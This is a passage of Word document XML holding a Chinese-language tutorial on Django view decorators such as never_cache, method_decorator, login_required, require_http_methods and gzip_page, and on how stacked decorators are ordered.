    <w:p w14:paraId="614F7535"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1F555213" w14:textId="1ADDB4FB" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="273A552E"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@never_cache</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03E29AFC" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果你想用头部完全禁掉缓存, 你可以使用@never_cache装饰器。如果你不在视图中使用缓存，服务器端是肯定不会缓存的，然而用户的客户端如浏览器还是会缓存一些数据，这时你可以使用never_cache禁用掉客户端的缓存。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27605DC9"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django.views.decorators.cache import never_cache</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36FAB040" w14:textId="405066B2" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A4864FC" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@never_cache</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25E1F953" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def myview(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61CD453F" w14:textId="6147CF04" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="138792AA" w14:textId="149989CA" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>其它常用装饰器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5312526F" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@method_decorator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F13B87" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>前面的案例中，我们的装饰器都是直接使用在</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>函数视图</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>上的。如果需要在基于类的视图上使用装饰器，我们需要使用到@method_decorator这个装饰器, 它的作用是将类伪装成函数方法。@method_decorator第一个参数一般是需要使用的装饰器名。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41855D4B" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BD38678" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.auth.decorators import login_required</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3458E961" w14:textId="6926AD4E" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.utils.decorators import method_decorator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51FDF917"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django.views.generic import TemplateView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1749D2CE" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="722576B5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@method_decorator(login_required, name='dispatch')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ADBA04F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ProtectedView(TemplateView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0628EE73" w14:textId="2247E2FC" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    template_name = 'secret.html'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B505B6F" w14:textId="16A1CA79" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04D0B13B" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@require_http_methods</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="552BDA4E" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>该装饰器的作用是限制用户的请求方法。如下例中仅接收GET和POST方法。与此类似的装饰器还有@require_POST, @require_GET和@require_safe。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E62D32E"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django.views.decorators.http import require_http_methods</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="004C5452" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00DABDE0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@require_http_methods(["GET", "POST"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05C31137"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489F445F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # Only accept GET or POST method</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B4B81A5" w14:textId="27782E91" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB93EBA" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5FA85F18" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@gzip_page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5954FE19" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>该装饰器可以压缩内容，前提是用户客户端允许内容压缩的话。使用方法如下:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CA4F1E1"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django.views.decorators.gzip import gzip_page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE014B0" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4ED7977B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@gzip_page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54564434" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def my_view(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29DB0279" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # Only accept GET or POST method</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="127D3983" w14:textId="4E9A6821" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="691419B9" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用多重装饰器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="432BC4D2" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>你可以在一个函数或基于类的视图上使用多重装饰器，但一定要考虑装饰器执行的先后顺序。比如下例中会先执行@never_cache, 再执行@login_required。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="012A7460" w14:textId="51FAA28A" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54BF304F" w14:textId="2840877C" w:rsidR="003802BB" w:rsidRPr="004300AE" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.auth.decorators import login_required</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45AD31B3" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.utils.decorators import method_decorator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20586DA8" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.views.decorators.cache import never_cache</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B738066" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1911B601" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@method_decorator(never_cache, name='dispatch')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DF6E7EA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@method_decorator(login_required, name='dispatch')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28DE71E8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ProtectedView(TemplateView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="577FFC09" w14:textId="542BA179" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    template_name = 'secret.html'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2695F31B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ProtectedView(TemplateView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F4BD88" w14:textId="78C487AD" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    template_name = 'secret.html'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F18098F" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18339628" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>上例等同于:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E447B2B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>decorators = [never_cache, login_required]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0585D62A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11D08A3B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
